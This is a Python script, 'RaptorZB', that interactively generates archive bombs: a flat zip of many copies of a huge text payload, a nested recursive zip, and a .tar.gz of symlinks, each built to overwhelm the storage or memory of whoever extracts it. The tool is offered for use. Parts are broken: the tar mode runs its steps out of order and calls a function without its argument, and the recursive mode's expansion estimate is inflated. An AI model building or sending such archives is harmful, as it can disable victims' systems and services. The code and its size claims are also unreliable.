# This is written by Arco Nightshade.

import os
import zipfile
import tarfile
import shutil
from pathlib import Path

# Welcoming stuff and cwd finding
print("Welcome to RaptorZB by Arco!")
print("Current working directory:", os.getcwd())

def print_final_size(file_path, extracted_mb=None):
    if os.path.exists(file_path):
        size_bytes = os.path.getsize(file_path)
        size_gb = size_bytes / (1024 ** 3)
        print(f"\n📦 Final compressed size: {size_gb:.2f} GB ({size_bytes:,} bytes)")
    else:
        print(f"[!] File not found: {file_path}")

    if extracted_mb is not None:
        extracted_gb = extracted_mb / 1024
        print(f"💥 Estimated extracted size: {extracted_gb:.2f} GB ({extracted_mb:,} MB)")

# Zip mode selection
while True:
    zip_mode = input("Choose mode: (1) Flat Zip Bomb, (2) Recursive Zip Bomb, (3) .tar.gz Bomb: ")
    if zip_mode in ["1", "2", "3"]:
        break
    else:
        print("Enter 1 or 2.")

# Getting payload size in mb from user
size_mb = int(input("Payload size in mb (Full number): "))


# Getting payload name from user
while True:
    payload_name = input("What is the payload file's name (No spaces, extension should be .md or .txt)? ")
    if payload_name.endswith(".txt") or payload_name.endswith(".md"):
        break
    else:
        print("Please make sure it has .txt or .md at the end.")


# Getting payload contents from user
payload_contents = input("What should the payload's contents be? (Has to be at least one character): ")

if zip_mode == "1":
    while True:
        zip_name = input("Zip name (Has to end with .zip): ")
        if zip_name.endswith(".zip"):
            break
        else:
            print("Please make sure the name ends with .zip!")

    copies = int(input("How many copies of the payload should be in the final zip? (Max: 1,000,000): "))
    user_file_name = input("What should the files be named in the zip (No spaces)? ")

    def create_payload():
        with open(payload_name, "w") as F:
            F.write(payload_contents * 1024 * 1024 * size_mb)
        print(f"Final payload: {payload_name} ({size_mb}MB)")



# Function for getting the payload file and duplicating it the specific amount of times the user specified
    def zipper():
        with zipfile.ZipFile(zip_name, "w", compression=zipfile.ZIP_DEFLATED) as Z:
            for i in range(copies):
                Z.write(payload_name, arcname=f"{user_file_name}{i}.md")
                print(f"Added file {i}")
            print()
            print(f"Added {i + 1} files total")
        print(f"RaptorZB Zip created: {zip_name} with {copies} files.")
        extracted_size_mb = size_mb * copies
        print_final_size(zip_name, extracted_size_mb)

    create_payload()
    zipper()
    os.remove(payload_name)
    print("Removed the payload file")

# Recursive mode
elif zip_mode == "2":
    while True:
        zip_name = input("Final recursive zip bomb name (must end in .zip!)? ")
        if zip_name.endswith(".zip"):
            break
        else:
            print("Please make sure the name ends with .zip!")

    levels = int(input("HOw many recursive layers? (5-10 is usually enough): "))

    def create_payload():
        with open(payload_name, "w") as F:
            F.write(payload_contents * 1024 * 1024 * size_mb)
        print(f"Final payload: {payload_name} ({size_mb}MB)")

    def recursive_zip():
        current_zip = "OwOgen0.zip"

        with zipfile.ZipFile(current_zip, "w", compression=zipfile.ZIP_DEFLATED) as Z:
            Z.write(payload_name)

        for level in range(1, levels + 1):
            next_zip = f"OwOgen{level}.zip"
            with zipfile.ZipFile(next_zip, "w", compression=zipfile.ZIP_DEFLATED) as Z:
                Z.write(current_zip)
            print(f"Nested level {level}: {current_zip} -> {next_zip}")
            os.remove(current_zip)
            current_zip = next_zip
        
        os.rename(current_zip, zip_name)
        print(f"\nRecursive OwOgen Zip Bomb created {zip_name} with {levels} nested layers.")
        extracted_size_mb = size_mb * (2 ** levels)
        print_final_size(zip_name, extracted_size_mb)
        os.remove(payload_name)
        print("Removed the payload file")

    create_payload()
    print("[DEBUG] Payload file created?")
    print("Exists:", os.path.exists(payload_name))
    recursive_zip()

# UNIX bomb style
elif zip_mode == "3":
    tar_name = input("Final archive name (must end in .tar.gz): ")
    if not tar_name.endswith(".tar.gz"):
        print("Invalid extension. Appending '.tar.gz'")
        tar_name += ".tar.gz"

    copies = int(input("How many symlinked files should be in the tar? (Try 10,000): "))
    user_file_name = input("What should the files be named in the archive (no spaces)? ")

    temp_dir = "tarbomb_temp"
    os.makedirs(temp_dir, exist_ok=True)

    def create_payload():
        with open(payload_name, "w") as f:
            f.write(payload_contents * 1024 * 1024 * size_mb)
        print(f"Payload created: {payload_name} ({size_mb}MB)")
        
    def create_tar_symlink_bomb(payload_path):
        for i in range(copies):
            link_name = Path(temp_dir) / f"{user_file_name}{i}.txt"
            try:
                os.symlink(payload_path, link_name)
            except Exception as e:
                print(f"[!] Failed to create symlink {link_name}: {e}")
                continue
            if i % 1000 == 0:
                print(f"Created {i} symlinks...")

    with tarfile.open(tar_name, "w:gz") as tar:
        tar.add(temp_dir, arcname=".")

    print(f"\nTAR.GZ Bomb created: {tar_name}")
    extracted_size_mb = size_mb * copies
    print_final_size(tar_name, extracted_size_mb)
    shutil.rmtree(temp_dir)
    os.remove(payload_path)


    # Execute
    create_payload()
    payload_path = os.path.abspath(payload_name)
    create_tar_symlink_bomb()


else:
    print("Invalid mode")